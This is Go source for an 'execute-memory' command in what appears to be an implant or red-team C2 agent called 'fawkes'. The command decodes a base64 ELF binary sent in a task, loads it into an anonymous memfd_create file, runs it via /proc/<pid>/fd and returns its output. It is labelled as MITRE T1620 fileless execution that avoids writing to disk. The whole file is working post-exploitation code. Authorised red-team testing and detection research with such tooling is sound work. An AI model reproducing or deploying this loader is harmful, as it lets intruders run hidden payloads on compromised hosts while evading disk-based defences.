//go:build linux

package commands

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"golang.org/x/sys/unix"
)

// ExecuteMemoryCommand executes an ELF binary entirely from memory using memfd_create.
type ExecuteMemoryCommand struct{}

func (c *ExecuteMemoryCommand) Name() string { return "execute-memory" }
func (c *ExecuteMemoryCommand) Description() string {
	return "Execute an ELF binary from memory via memfd_create without writing to disk (T1620)"
}

type executeMemoryArgs struct {
	BinaryB64 string `json:"binary_b64"` // base64-encoded ELF binary
	Arguments string `json:"arguments"`  // command-line arguments (space-separated)
	Timeout   int    `json:"timeout"`    // execution timeout in seconds (default: 60)
}

func (c *ExecuteMemoryCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: binary_b64 parameter required (base64-encoded ELF binary)",
			Status:    "error",
			Completed: true,
		}
	}

	var args executeMemoryArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if args.BinaryB64 == "" {
		return structs.CommandResult{
			Output:    "Error: binary_b64 is empty",
			Status:    "error",
			Completed: true,
		}
	}

	binaryData, err := base64.StdEncoding.DecodeString(args.BinaryB64)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error decoding binary: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(binaryData) < 4 {
		return structs.CommandResult{
			Output:    "Error: binary data too small to be valid",
			Status:    "error",
			Completed: true,
		}
	}

	// Validate ELF magic bytes
	if binaryData[0] != 0x7f || binaryData[1] != 'E' || binaryData[2] != 'L' || binaryData[3] != 'F' {
		return structs.CommandResult{
			Output:    "Error: not a valid ELF binary (missing magic header)",
			Status:    "error",
			Completed: true,
		}
	}

	timeout := args.Timeout
	if timeout <= 0 {
		timeout = 60
	}

	// Create anonymous memory file descriptor
	fd, err := unix.MemfdCreate("", 0)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: memfd_create failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	file := os.NewFile(uintptr(fd), "memfd")
	defer file.Close()

	// Write ELF binary to memfd
	if _, err := file.Write(binaryData); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error writing binary to memfd: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Build execution path using the parent process PID.
	// /proc/<pid>/fd/<fd> resolves to the memfd in both parent and child contexts
	// (unlike /proc/self/fd/<fd> which changes meaning after fork).
	execPath := fmt.Sprintf("/proc/%d/fd/%d", os.Getpid(), fd)

	// Parse command-line arguments
	var cmdArgs []string
	if args.Arguments != "" {
		cmdArgs = strings.Fields(args.Arguments)
	}

	// Execute with timeout
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, execPath, cmdArgs...)

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	execErr := cmd.Run()

	// Build output from stdout + stderr
	var sb strings.Builder
	if stdout.Len() > 0 {
		sb.WriteString(stdout.String())
	}
	if stderr.Len() > 0 {
		if sb.Len() > 0 {
			sb.WriteString("\n")
		}
		sb.WriteString("[stderr] ")
		sb.WriteString(stderr.String())
	}

	if execErr != nil {
		if ctx.Err() == context.DeadlineExceeded {
			sb.WriteString(fmt.Sprintf("\n[Process timed out after %ds]", timeout))
		}
		output := sb.String()
		if output == "" {
			output = fmt.Sprintf("Error executing binary: %v", execErr)
		}
		return structs.CommandResult{
			Output:    output,
			Status:    "error",
			Completed: true,
		}
	}

	output := sb.String()
	if output == "" {
		output = fmt.Sprintf("[+] Binary executed successfully (%d bytes, no output)", len(binaryData))
	}

	return structs.CommandResult{
		Output:    output,
		Status:    "success",
		Completed: true,
	}
}
